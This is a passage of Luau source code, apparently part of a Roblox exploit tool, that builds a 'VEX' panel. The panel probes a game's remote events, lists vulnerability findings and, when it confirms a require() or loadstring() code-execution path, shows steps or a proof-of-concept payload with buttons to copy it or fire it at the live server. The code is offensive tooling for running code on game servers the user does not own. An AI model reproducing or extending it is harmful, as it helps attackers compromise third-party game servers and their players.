    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,
    ScrollingDirection=Enum.ScrollingDirection.Y,ZIndex=4},VR)
pad(10,8,LOG_SCROLL); listV(LOG_SCROLL,3)

local LOG_EMPTY=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="VEX takes an AVD vulnerability finding and\n"..
         "systematically probes the remote to map its\n"..
         "internal logic from the outside.\n\n"..
         "Select a finding from the left panel or type a\n"..
         "remote name and press ⚡ RUN VEX.",
    TextColor3=C.MUTED,TextSize=10,TextWrapped=true,
    Size=UDim2.new(1,0,0,100),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},LOG_SCROLL)

-- Show/hide result card and resize log scroll accordingly
local function showResultCard(show)
    RESULT_CARD.Visible = show
    if show then
        LOG_SCROLL.Size = UDim2.new(1,0,1,-100)  -- shrink to make room
    else
        LOG_SCROLL.Size = UDim2.new(1,0,1,-4)
    end
end

-- log helpers
local vN=0
local function addLog(tag,msg,detail,hi)
    LOG_EMPTY.Visible=false
    vN+=1; mkRow(tag,msg,detail,hi,LOG_SCROLL,vN)
    task.defer(function()
        LOG_SCROLL.CanvasPosition=Vector2.new(0,LOG_SCROLL.AbsoluteCanvasSize.Y)
    end)
end
local function addLogSep(txt) vN+=1; mkSep(txt,LOG_SCROLL,vN) end
local function clearLog()
    for _,c in ipairs(LOG_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    vN=0; LOG_EMPTY.Visible=true
    showResultCard(false)
    tw(PROG_BAR,TI.fast,{Size=UDim2.new(0,0,1,0)})
end

-- ── AVD findings panel refresh ────────────────────────────────────────────────
local selFinding = nil

local function refreshFindings()
    for _,c in ipairs(FIND_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    local findings = G.AVD_FINDINGS
    if not findings or #findings == 0 then
        FIND_EMPTY.Visible=true; return
    end
    FIND_EMPTY.Visible=false

    local SEV_COL={CRITICAL=Color3.fromRGB(255,40,40),HIGH=Color3.fromRGB(255,80,80),
        MEDIUM=Color3.fromRGB(255,160,40),LOW=Color3.fromRGB(80,140,255)}

    for i, f in ipairs(findings) do
        local col = SEV_COL[f.vuln.severity] or C.MUTED
        local sel = selFinding == f

        local card=mk("TextButton",{AutoButtonColor=false,
            BackgroundColor3=sel and Color3.fromRGB(20,8,8) or C.CARD,
            BorderSizePixel=0,Text="",
            Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
            ZIndex=4,LayoutOrder=i},FIND_SCROLL)
        corner(5,card)
        if sel then stroke(col,1,card) else stroke(C.BORDER,1,card) end
        pad(8,5,card); listV(card,3)

        local hrow=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
            Size=UDim2.new(1,0,0,15),ZIndex=5,LayoutOrder=1},card)
        listH(hrow,5)

        -- severity chip
        local sc=mk("Frame",{BackgroundColor3=col,BorderSizePixel=0,
            Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=6},hrow)
        corner(3,sc); mk("UIPadding",{PaddingLeft=UDim.new(0,4),PaddingRight=UDim.new(0,4)},sc)
        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
            Text=f.vuln.severity,TextColor3=Color3.fromRGB(8,8,12),TextSize=7,
            Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=7},sc)

        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
            Text=f.remote,TextColor3=sel and C.WHITE or col,TextSize=10,
            Size=UDim2.new(1,-80,1,0),TextXAlignment=Enum.TextXAlignment.Left,
            ZIndex=6,LayoutOrder=2},hrow)

        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
            Text=f.vuln.label,TextColor3=C.TEXT,TextSize=9,
            Size=UDim2.new(1,0,0,13),TextXAlignment=Enum.TextXAlignment.Left,
            ZIndex=5,LayoutOrder=2},card)
        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
            Text=f.detail or "",TextColor3=C.MUTED,TextSize=8,TextWrapped=true,
            Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
            TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5,LayoutOrder=3},card)

        card.MouseButton1Click:Connect(function()
            selFinding = f
            TARGET_BOX.Text = f.remote
            refreshFindings()
            -- Visual "armed" state — RUN button pulses to show it's ready
            tw(RUN_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(220,40,40)})
            VEX_STATUS.Text = "armed — "..f.remote
            VEX_STATUS.TextColor3 = Color3.fromRGB(255,120,40)
        end)
    end
end

-- ── RUN VEX ───────────────────────────────────────────────────────────────────
local running=false
local currentSession=nil

RUN_BTN.MouseButton1Click:Connect(function()
    if running then return end
    local name = TARGET_BOX.Text:match("^%s*(.-)%s*$")
    if name == "" then
        VEX_STATUS.Text = "enter a remote name"
        VEX_STATUS.TextColor3 = Color3.fromRGB(255,80,80)
        return
    end

    running = true
    clearLog()
    tw(RUN_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(60,10,10)})
    VEX_STATUS.Text = "running..."
    VEX_STATUS.TextColor3 = Color3.fromRGB(255,80,80)

    addLogSep("VEX SESSION — "..name)

    currentSession = runVEX(
        name,
        selFinding and selFinding.vuln or nil,
        addLog,
        -- progress callback
        function(current, total, label)
            local pct = current/total
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(pct,0,1,0)})
            VEX_STATUS.Text = ("probe %d/%d"):format(current,total)
        end,
        -- completion callback
        function(session)
            running = false
            tw(RUN_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(180,30,30)})
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})

            -- Code execution confirmed — highest priority result
            if session and session.codeExecConfirmed then
                local path = session.execPath or "unknown"
                VEX_STATUS.Text = "⚡ CODE EXEC — "..path:upper()
                VEX_STATUS.TextColor3 = Color3.fromRGB(255,80,80)

                showResultCard(true)
                RESULT_CARD.BackgroundColor3 = Color3.fromRGB(16,4,4)
                stroke(RESULT_CARD.Parent and
                    RESULT_CARD:FindFirstChildOfClass("UIStroke") or
                    Instance.new("UIStroke",RESULT_CARD),
                    Color3.fromRGB(255,40,40), 2)

                RESULT_TITLE.Text      = "⚡ CODE EXECUTION PATH CONFIRMED — "..path:upper()
                RESULT_TITLE.TextColor3= Color3.fromRGB(255,40,40)

                if path == "require" then
                    RESULT_PAYLOAD.Text =
                        "require() path is open.\n\n"..
                        "1. Create a public ModuleScript on Roblox\n"..
                        "2. Get its asset ID\n"..
                        "3. Fire this remote with that ID as the argument\n"..
                        "4. Server will download and execute your module\n"..
                        "   with full server trust."
                    RESULT_PAYLOAD.TextColor3 = Color3.fromRGB(255,160,40)
                    RESULT_COPY.Text = "Copy Steps"
                    RESULT_COPY.MouseButton1Click:Connect(function()
                        pcall(setclipboard,
                            "require() path confirmed on "..session.remote..
                            "\n1. Create public ModuleScript on Roblox\n"..
                            "2. Fire remote with asset ID as arg\n"..
                            "3. Server executes your module with full trust")
                        RESULT_COPY.Text="Copied!"
                        task.delay(1.5,function()
                            if RESULT_COPY.Parent then RESULT_COPY.Text="Copy Steps" end
                        end)
                    end)
                else
                    -- loadstring path
                    local exploitCode = session.exploitCode or "return game.PlaceId"
                    local exploitPayload = session.execPayload or {exploitCode}
                    RESULT_PAYLOAD.Text =
                        "loadstring() path is open.\n\n"..
                        "Proof-of-concept payload:\n"..
                        tostring(exploitPayload[1]):sub(1,200)
                    RESULT_PAYLOAD.TextColor3 = Color3.fromRGB(255,120,40)

                    RESULT_COPY.Text = "Copy PoC"
                    RESULT_COPY.MouseButton1Click:Connect(function()
                        pcall(setclipboard, tostring(exploitPayload[1]))
                        RESULT_COPY.Text="Copied!"
                        task.delay(1.5,function()
                            if RESULT_COPY.Parent then RESULT_COPY.Text="Copy PoC" end
                        end)
                    end)

                    RESULT_FIRE.Text = "▶ Fire PoC"
                    RESULT_FIRE.MouseButton1Click:Connect(function()
                        addLogSep("FIRING PROOF OF CONCEPT")
                        local remote2 = findR(session.remote)
                        if not remote2 then
                            addLog("INFO","Remote not found"); return
                        end
                        local result2 = fireProbe(remote2, exploitPayload)
                        addLog(result2.interesting and "FINDING" or "CLEAN",
                            "PoC fired — server returned: "..result2.retStr,
                            (#result2.deltas>0 and
                                result2.deltas[1].path.." → "..result2.deltas[1].av or
                                "no state change"),
                            result2.interesting)

                        -- Parse server response if it looks like our sentinel output
                        if result2.retStr:find("PlaceId=") or
                           result2.retStr:find("JobId=") or
                           result2.retStr:find("DataStore=") then
                            addLog("FINDING",
                                "⚡ Server-side execution CONFIRMED",
                                "Response contains server-internal data: "..
                                result2.retStr:sub(1,100),
                                true)
                        end
                    end)
                end

            elseif session and session.finalPayload then
                -- Normal optimal payload result
                local ps = payloadStr(session.finalPayload)
                VEX_STATUS.Text = "PAYLOAD FOUND — depth "..
                    tostring(session.finalDepth)
                VEX_STATUS.TextColor3 = Color3.fromRGB(255,160,40)

                showResultCard(true)
                RESULT_TITLE.Text   = "OPTIMAL PAYLOAD"
                RESULT_TITLE.TextColor3 = Color3.fromRGB(255,80,80)
                RESULT_PAYLOAD.Text = ps

                RESULT_COPY.MouseButton1Click:Connect(function()
                    pcall(setclipboard, ps)
                    RESULT_COPY.Text = "Copied!"
                    task.delay(1.5,function()
                        if RESULT_COPY.Parent then RESULT_COPY.Text="Copy Payload" end
                    end)
                end)

                RESULT_FIRE.MouseButton1Click:Connect(function()
                    addLogSep("FIRING OPTIMAL PAYLOAD")
                    local remote2 = findR(session.remote)
                    if remote2 then
                        local result2 = fireProbe(remote2, session.finalPayload)
                        addLog(result2.interesting and "FINDING" or "CLEAN",
                            "Optimal payload fired — depth "..result2.depth,
                            "ret: "..result2.retStr, result2.interesting)
                        for _, ch in ipairs(result2.deltas) do
                            addLog(ch.bad and "PATHOLOG" or "DELTA",
                                ch.path, ch.bv.." → "..ch.av, true)
                        end
                    end
                end)
            else
                VEX_STATUS.Text = "no exploitable path found"
                VEX_STATUS.TextColor3 = C.MUTED
            end
        end
    )
end)

ABORT_BTN.MouseButton1Click:Connect(function()
    if currentSession then
        currentSession.aborted = true
        addLog("INFO","⬛ Session aborted by user")
        VEX_STATUS.Text = "aborted"
        VEX_STATUS.TextColor3 = C.MUTED
        tw(RUN_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(180,30,30)})
        running = false
    end
end)

-- Auto-refresh AVD findings when tab opens
P_VEX:GetPropertyChangedSignal("Visible"):Connect(function()
    if P_VEX.Visible then refreshFindings() end
end)

-- Export
G.VEX_SESSIONS = SESSIONS
G.vex_run      = runVEX

if G.addTab then
    G.addTab("vex","VEX",P_VEX)
else
    warn("[Oracle] G.addTab not found")
end
